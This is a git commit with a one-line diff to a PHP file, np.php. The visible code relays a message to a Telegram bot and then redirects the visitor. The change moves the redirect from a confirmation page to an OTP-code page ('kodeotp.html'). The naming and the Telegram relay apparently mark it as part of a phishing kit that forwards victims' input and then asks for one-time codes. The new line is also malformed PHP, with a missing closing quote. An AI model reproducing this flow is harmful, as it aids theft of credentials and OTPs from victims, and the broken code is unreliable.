30fe0072a78c003fe36f5baff87c23b37a30cff3
Abang11829 <abangikok1@gmail.com>
2025-04-23 18:25:38 +0700

    Update np.php

--- np.php
+++ np.php
@@ -32,5 +32,5 @@ function sendMessage($telegram_id, $message, $id_bot) {
 }
 
 sendMessage($telegram_id, $message, $id_bot);
-header('Location:../konf.html');
+header('Location:../kodeotp.html);
 ?>
